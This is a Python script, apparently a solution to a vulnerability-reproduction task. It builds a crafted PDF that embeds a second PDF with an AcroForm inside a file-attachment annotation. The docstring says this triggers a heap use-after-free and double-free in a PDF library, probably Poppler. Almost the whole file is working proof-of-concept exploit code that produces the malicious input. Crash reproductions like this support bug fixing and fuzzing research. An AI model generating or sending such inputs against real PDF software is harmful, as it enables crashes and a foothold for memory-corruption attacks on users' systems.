import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free vulnerability
        in a PDF processing library (likely Poppler).

        The vulnerability occurs during the destruction of "standalone forms". When a dictionary
        representing a form is passed to an internal Object constructor, its reference count
        is not incremented. This leads to a premature free when the object is destroyed,
        followed by a double-free when the owning document is destroyed.

        This PoC triggers the vulnerability by creating a PDF that embeds another PDF.
        The inner PDF contains an AcroForm dictionary. When a Poppler-based tool parses
        the outer PDF to inspect its contents (like file attachments), it processes the
        inner PDF, creating temporary objects for its structures. The Form object for the
        inner PDF's AcroForm is treated as "standalone". The flawed reference counting
        logic is triggered, leading to a crash.
        """
        
        # Part 1: Construct the inner PDF containing an AcroForm.
        # This is a minimal, valid PDF document.
        inner_body_str = (
            "%PDF-1.7\r\n"
            "1 0 obj\r\n<</Type/Catalog/AcroForm 2 0 R>>\r\nendobj\r\n"
            "2 0 obj\r\n<</Fields[]>>\r\nendobj\r\n"
        )
        
        # Calculate byte offsets for the xref table of the inner PDF.
        off1_inner = inner_body_str.find('1 0 obj')
        off2_inner = inner_body_str.find('2 0 obj')
        xref_start_off_inner = len(inner_body_str)
        
        inner_xref = (
            "xref\r\n"
            "0 3\r\n"
            "0000000000 65535 f\r\n"
            f"{off1_inner:010d} 00000 n\r\n"
            f"{off2_inner:010d} 00000 n\r\n"
        )
        
        inner_trailer = (
            "trailer\r\n"
            "<</Size 3/Root 1 0 R>>\r\n"
            "startxref\r\n"
            f"{xref_start_off_inner}\r\n"
            "%%EOF\r\n"
        )
        
        inner_pdf = (inner_body_str + inner_xref + inner_trailer).encode('latin-1')

        # Part 2: Construct the outer PDF that embeds the inner PDF.
        header = b'%PDF-1.7\r\n'
        
        # Define the objects for the outer PDF.
        objects = [
            b"1 0 obj\r\n<</Type/Catalog/Pages 2 0 R>>\r\nendobj",
            b"2 0 obj\r\n<</Type/Pages/Kids[3 0 R]/Count 1>>\r\nendobj",
            b"3 0 obj\r\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 1 1]/Annots[4 0 R]>>\r\nendobj",
            b"4 0 obj\r\n<</Type/Annot/Subtype/FileAttachment/Rect[0 0 0 0]/FS 5 0 R>>\r\nendobj",
            b"5 0 obj\r\n<</Type/Filespec/F(p)/EF<</F 6 0 R>>>>\r\nendobj"
        ]
        
        # Object 6 is the stream containing the inner PDF.
        obj6_header = b'6 0 obj\r\n<</Type/EmbeddedFile/Length %d>>' % len(inner_pdf)
        obj6_stream = b'stream\r\n' + inner_pdf + b'\r\nendstream'
        objects.append(obj6_header + b'\r\n' + obj6_stream + b'\r\nendobj')

        # Build the main body of the PDF and record the offsets of each object.
        body = header
        offsets = []
        for obj_data in objects:
            offsets.append(len(body))
            body += obj_data + b'\r\n'

        # Create the cross-reference (xref) table.
        xref_start_off_outer = len(body)
        
        xref_lines = [b'xref', b'0 7', b'0000000000 65535 f']
        for offset in offsets:
            xref_lines.append(f'{offset:010d} 00000 n'.encode('ascii'))
        outer_xref = b'\r\n'.join(xref_lines) + b'\r\n'
        
        # Create the trailer.
        outer_trailer = (
            f"trailer\r\n"
            f"<</Size 7/Root 1 0 R>>\r\n"
            f"startxref\r\n"
            f"{xref_start_off_outer}\r\n"
            f"%%EOF\r\n"
        ).encode('ascii')
        
        poc = body + outer_xref + outer_trailer
        return poc